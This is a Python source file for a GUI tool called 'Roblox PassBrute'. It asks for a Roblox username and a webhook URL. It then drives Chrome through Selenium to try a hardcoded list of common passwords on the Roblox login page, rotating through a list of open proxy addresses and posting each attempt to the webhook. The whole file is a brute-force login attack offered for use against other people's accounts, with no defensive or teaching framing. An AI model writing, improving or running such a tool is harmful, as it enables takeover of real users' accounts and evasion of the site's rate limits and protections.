# Copyright (c)  (https://discord.gg/pQUFjaJ2EN)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import sys
import time
import requests
import random
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox)
from PyQt5.QtGui import QColor, QPalette
from PyQt5.QtCore import Qt


default_passwords = [
    "password123", "qwerty123", "12345678", "letmein123", "roblox1234", "dragon123", "guest1234", 
    "admin1234", "hello1234", "iloveyou1", "welcome123", "monkey123", "abc12345", "1q2w3e4r5t", 
    "sunshine1", "password1", "adminadmin", "blink182!", "superman1", "trustno1!", "football1", 
    "baseball1", "batman123", "shadow123", "master123", "freedom12", "123456789", "adminpass1", 
    "administrator", "passw0rd!", "p@ssw0rd1", "qwerty123", "login1234", "access123", "123qweasd", 
    "myspace1!", "zaq12wsx3", "abc12345!", "princess1", "welcome12", "hello2023", "whatever1", 
    "jordan23!", "mustang12", "harley123", "hunter123", "michael1", "computer1", "secret123", 
    "freedom12", "money1234", "password2", "iloveyou2", "admin2023", "welcome1!", "hello1234", 
    "summer23!", "fall2023!", "winter23!", "spring23!", "test1234", "demo1234", "temp1234", 
    "changeme!", "default12", "guest1234", "user1234", "example1", "sample123", "pass1234", 
    "mypassword", "simplepass", "letmein!", "welcome!", "password!", "adminroot", "adminpass", 
    "rootadmin", "admin2023", "password!", "root1234", "admin1234", "default12", "guest2023", 
    "temporary1", "testing12", "testpass1", "demoaccount", "temporary", "samplepass", "sample123", 
    "example12", "backup123", "control1!", "config123", "service1!", "support1!", "access12", 
    "server123", "database1", "monitor12", "testtest1", "testing12", "developer", "readonly1", 
    "manager1!", "security1", "firewall1", "network1!", "password9", "simple123", "password0", 
    "adminuser", "userpass1", "manager12", "employee1", "client123", "partner12", "contract1", 
    "agreement", "register1", "session12", "validate1", "confirm12", "activate1", "premium1!", 
    "standard1", "basic1234", "default22", "guest2024", "visitor12", "account1!", "session22", 
    "connect1!", "binding12", "request1!", "response1", "server123", "database2", "monitor22", 
    "backup123", "control22", "config123", "service22", "support22", "access222"
]


chrome_driver_path = "chromedriver.exe"


proxies = [
    "154.65.39.7:80", "154.65.39.8:80", "148.230.195.165:6969", "2.179.193.146:80",
    "168.132.150.37:8080", "86.77.217.16:8081", "31.62.179.218:5472", "185.105.182.189:80",
    "111.72.194.201:2324", "197.232.85.163:8080", "103.179.252.167:8181", "103.191.115.252:82",
    "181.78.21.74:999", "181.78.21.38:999", "103.147.246.185:3127", "89.159.227.130:999",
    "222.68.36.25:1080", "182.204.182.147:1080", "69.49.228.101:3128", "103.219.75.2:8080",
    "115.147.63.59:8081", "36.72.23.92:8000", "103.169.255.196:6080", "103.133.26.75:8181",
    "160.22.22.89:3125", "222.68.36.49:1080", "36.37.224.125:8080", "182.186.114.66:8080",
    "177.72.156.75:8080", "216.158.246.90:51012", "38.255.23.131:999", "8.28.152.111:80",
    "103.158.162.18:8000", "27.79.194.186:16000", "45.115.253.30:83", "103.165.157.248:8090",
    "87.187.175.215:16000", "27.79.248.34:16000", "161.97.136.31:3128", "95.182.54.203:8080",
    "186.92.89.180:58339", "163.247.23.181:11111", "27.79.164.240:16000", "119.2.48.12:9669",
    "41.40.175.222:8080", "27.79.239.236:16000", "41.220.138.246:8040", "111.232.16.22:3389",
    "27.79.156.251:16000"
]

class InputWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Roblox PassBrute - Webhook & Username")
        self.setFixedSize(600, 400)
        self.setStyleSheet("background-color: #0f0f17; color: #A855F7; font-size: 18px;")

        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignCenter)

        
        self.webhookInput = QLineEdit()
        self.webhookInput.setPlaceholderText("Enter Webhook URL...")
        self.webhookInput.setStyleSheet("background-color: #0f0f17; color: #A855F7; padding: 10px;")

        self.usernameInput = QLineEdit()
        self.usernameInput.setPlaceholderText("Enter Roblox Username...")
        self.usernameInput.setStyleSheet("background-color: #0f0f17; color: #A855F7; padding: 10px;")

        self.startButton = QPushButton("Start PassBrute")
        self.startButton.setStyleSheet("background-color: #A855F7; color: white; padding: 15px; font-size: 22px;")
        self.startButton.clicked.connect(self.start_pass_brute)

        
        layout.addWidget(QLabel("Webhook URL:"), alignment=Qt.AlignCenter)
        layout.addWidget(self.webhookInput, alignment=Qt.AlignCenter)

        layout.addWidget(QLabel("Roblox Username:"), alignment=Qt.AlignCenter)
        layout.addWidget(self.usernameInput, alignment=Qt.AlignCenter)

        layout.addWidget(self.startButton, alignment=Qt.AlignCenter)

        self.setLayout(layout)

    def start_pass_brute(self):
        webhook_url = self.webhookInput.text().strip()
        username = self.usernameInput.text().strip()

        if not webhook_url or not username:
            QMessageBox.warning(self, "Error", "Please enter both a valid webhook URL and a Roblox username.")
            return

        passwords = default_passwords

        
        service = Service(chrome_driver_path)

        for password in passwords:
            if not password.strip():
                continue
            log_message = f"Trying: {password} for username: {username}\n"

            
            if webhook_url:
                try:
                    requests.post(webhook_url, json={"content": log_message})
                except Exception as e:
                    print(f"Error sending to webhook: {e}")

            print(log_message.strip())

            
            proxy = random.choice(proxies) if proxies else None

            
            try:
                options = Options()
                options.add_argument('--incognito')
                options.add_argument('--disable-extensions')
                if proxy:
                    options.add_argument(f'--proxy-server={proxy}')
                    print(f'Using proxy: {proxy}')

                driver = webdriver.Chrome(service=service, options=options)
                driver.get("https://www.roblox.com/Login")

                driver.find_element(By.ID, "login-username").send_keys(username)
                driver.find_element(By.ID, "login-password").send_keys(password)
                driver.find_element(By.ID, "login-button").click()
                time.sleep(2)
                driver.quit()
            except Exception as e:
                print(f"Error with Selenium: {e}")

            time.sleep(1)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = InputWindow()
    window.show()
    sys.exit(app.exec_())
